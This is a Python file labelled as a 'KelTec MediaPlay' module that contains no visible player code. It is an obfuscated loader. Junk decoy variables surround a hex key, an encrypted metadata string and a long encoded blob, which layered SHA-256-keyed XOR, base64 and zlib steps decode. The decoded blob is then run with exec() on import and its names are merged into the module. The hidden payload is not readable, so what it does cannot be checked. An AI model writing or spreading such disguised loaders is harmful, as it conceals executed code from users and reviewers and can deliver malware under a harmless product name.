# -*- coding: utf-8 -*-
# KelTec MediaPlay 

_lx0_0 = 161638 ^ 161884
_lx1_1 = len("10a5af")
import zlib as _z,base64 as _b,hashlib as _h,sys as _s,os as _o
_lx2_2 = abs(-710031)
_lx3_3 = 920274 * 0
_lx4_4 = 969638 ^ 699363
_K = 'bc992912cf379df3e389ba5647902fb6c14b992052840eaaec7c9050640f30a2'
_M = 'nUKEqLnbz6pOSDk9sjrN68bcsEE4E7oPG9aT1cVqYVOdHdSurZ3J+xEbZju/bM/owd/sEGsT6lsfgcHRlGUzUsZPhqn+zsOqRhkw'
_D = '=I96iqdkaNObXcBSPZ6WIB8q8lMAlLV98eHk6XrIAjHr0WvPKBcQlBWXFjSmoCITVTBsO467vxCPdxYR2LYZgSdbm5KtAv37WL+9zSdpZjJCFE+t5qqeoN7tjmJVRRn5fdFtYUuZe5BlDZ5rl+UQWgTQeH3xfpFY9iGWR4gj+zSoA6ywHj7pxVCvMiJd1DMSWAnv5w7UVCejMFTDFZWyY+7rBm7VVli11iFSvnhngvFhX6Xgp/EFTY/apTaH8uoFAuYMY6eunfrX76QAkDM0OihnMm7LSr5EpeNYQnloXA+GyMzZx32FrFRCQpIDjn11KxLzy7elwFGN87sl8kfrr9hlKk9Mqj/thsKFUARJh/1L4Rb/1PVR4JR3ma3zEK6+8OY4v1QVArnNSB7G5RZJT8tgqvtga46EINNwRYrMdPQpQa/x+OTBEr/Kw8c3RZAhFob9GqBTpKctJzLsWw2JVgvuW7b3dm29D4Mpzy2FjAp8nbsLO0N8vQQehGg7YeI2oC18mknGvwZiMeTZKnQFE9yp1GA3a7nKdLBjLhZiizgc9rQalyOTDlLrP6QfVTZaH2eA1Yrj0YkFKaCcx2m4dwJZaNMlu56GzeCuzdBMVGDl6gYZMpYe3o1aNPZuGVIOVFb2cNqdwNLy05vDI+ygzX6E7KleuZp7TP16S0IEtSKzaP2J7IGta0yYWeb3VSeqpCXz3Gzq5r7BGwLUzUobNJJCr5E14Bx5wkTVyJ92plRXfSOceM0N3jrmUeI2RmYIcvk7ADfc9+yeO/7Zd0Eqx0sI8DlnEPta0U51UjCJDy5qIVmHc6Wv/274rXu1OZfJs9G8RcZeDwzN/+S5uJ5PuRNTWyQWWmzlsmDjLonjNM/F63i+kCqoVxBzDvlF0KpxH+NfuCqTTSIRb0PwzenxS1HdTdIDrSOHI+bn23dDLxNKpPb8Gro5iNemZ5fszUftOmiEfCsV3g+ZDFCiAnZ7j7Tp1TXZJgGrmaCOznHe0JWnOtmifu1NfTjhvNoPd+N/7D6A9E3GYk24odHWfFY6iMZJR1cvXUcDMaDHtu9G6TW1N0NTBECuQqllYYPLEZM6FLbg68ObFsfr/qjOgXtgrD+oevpiKgc4iui1sg979lsnLmTNSEKACHZSzXukCfYAIfaRFIAKsQ4GnRangsGTIhtaN3qHV55oNEC2PzWNH+w+hNG1juOWvvUYcS9vsz/5mzrabAXFY4E8wj1AinRriKKT9w33mh4bsmpwevYaBHwj0gmy4KT0rp1+PJ0Tlo60IkwzsM44O4TDUoWD8XCm0r66DfxOYs2m+ScAQal52vE5zyQnk/cnlod1TuGBEg6r7F6zJ4fnTn2XQ7pX2NP4FMcy/zgkIc+HwbkpGaTVXm1CuKZWO+Y6iWeGY8xt/86rxGvj62KjRnE+GgIatpKBGhzOhu6IK5+fKSh38djp/x3Xkdo/fNYrLnJGTpvzw/hxH1lkKRQdyycstqDivADxLfSMV8JD35hgXLYdY+gjhzdzkGnYLAyUh2m66jbI13yaJ0//s/YmkSZsw8gsKevhDbo4LHhG2KZnDsnPM1ESTwBUTV0bp1RO6JjRU4FDN2rshMkgZpNTrXT1t+h2nfzq85LD1caSUcV7FBk6S8TkYiQTM3yJWo1qhLvp0mnmuMcaoChGhe271Z/y8odIH1nY7EnFpTrkUrfQ/RadX4/r9K9txdQnDs3WcIELazRs1XKD643fzdPK3DDOKGUghefme+coXZHeWJZJyGNAxFwXipUWwYC86PKtch5AQzZrBJwHEaZ0GpZVb5HjzeNTRnfBKB7GSN6Bfctae3tTpWckky9e3XyPJOBKLy6D91tqKir0rVtSl7j0V7riT04N'

def _xr(d,k):
    kl=len(k);return bytes(d[i]^k[i%kl] for i in range(len(d)))
def _dk(sd,c):
    return _h.sha256((_K+sd+str(c)).encode('utf-8')).digest()
def _dc(s,c,sd):
    r=_b.b64decode(s[::-1]);return _z.decompress(_xr(r,_dk(sd,c))).decode('utf-8')
def _run():
    mk=_h.sha256(_K.encode('utf-8')).digest()
    meta=_xr(_b.b64decode(_M),mk).decode('utf-8').split(':',2)
    sd=meta[0];nc=int(meta[1])
    d=_D
    for c in range(nc-1,-1,-1):d=_dc(d,c,sd)
    idx=d.find('||')
    src=d[idx+2:] if idx!=-1 else d
    _e={'__name__':'__main__','__file__':__file__}
    exec(compile(src,'<mediaplay>','exec'),_e)
    return _e
_e=_run()
globals().update({_k:_v for _k,_v in _e.items() if not _k.startswith('_')})